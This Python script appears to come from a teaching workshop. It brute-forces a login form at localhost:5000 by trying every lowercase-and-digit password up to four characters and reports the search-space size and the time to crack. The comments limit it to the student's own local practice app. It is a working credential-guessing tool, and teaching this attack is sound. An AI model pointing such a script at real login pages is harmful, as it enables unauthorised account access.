"""
Brute-force bot for the workshop.

It tries every possible password against the login in app.py until one
works. Point it ONLY at your own target (the app.py running on your own
machine or Codespace).

Run app.py in one terminal first, then in another terminal:
    python bot.py
"""

import itertools
import string
import time

import requests

# Attack YOUR OWN target only. Inside a Codespace this stays localhost,
# which keeps the traffic inside your own container.
URL = "http://localhost:5000/login"

# Must match the character set the target uses.
ALPHABET = string.ascii_lowercase + string.digits
MAX_LENGTH = 4


def total_combinations():
    """How big is the search space? Compute it so students can feel it."""
    return sum(len(ALPHABET) ** n for n in range(1, MAX_LENGTH + 1))


def brute_force():
    print(f"Search space: {total_combinations():,} possible passwords")
    attempts = 0
    start = time.time()

    for length in range(1, MAX_LENGTH + 1):
        for combo in itertools.product(ALPHABET, repeat=length):
            guess = "".join(combo)
            attempts += 1
            response = requests.post(URL, data={"password": guess})
            if response.status_code == 200:
                elapsed = time.time() - start
                print(f"\nFOUND IT: '{guess}'")
                print(f"Server said: {response.text}")
                print(f"Took {attempts:,} attempts in {elapsed:.1f} seconds")
                return guess

            # Uncomment to watch every guess fly by:
            # print(f"tried {guess}")

    print("Exhausted the search space without finding the password.")
    return None


if __name__ == "__main__":
    brute_force()
